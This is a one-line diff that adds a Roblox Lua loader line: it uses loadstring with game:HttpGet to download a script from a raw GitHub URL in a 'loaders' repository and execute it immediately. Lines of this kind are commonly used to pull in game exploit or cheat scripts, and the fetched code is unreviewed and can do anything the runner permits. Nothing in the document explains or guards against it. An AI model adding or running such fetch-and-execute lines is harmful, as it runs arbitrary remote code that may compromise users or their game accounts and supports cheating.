@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/electricity-bricklayer-spam3-rfepiegck50hcq.lua"))()
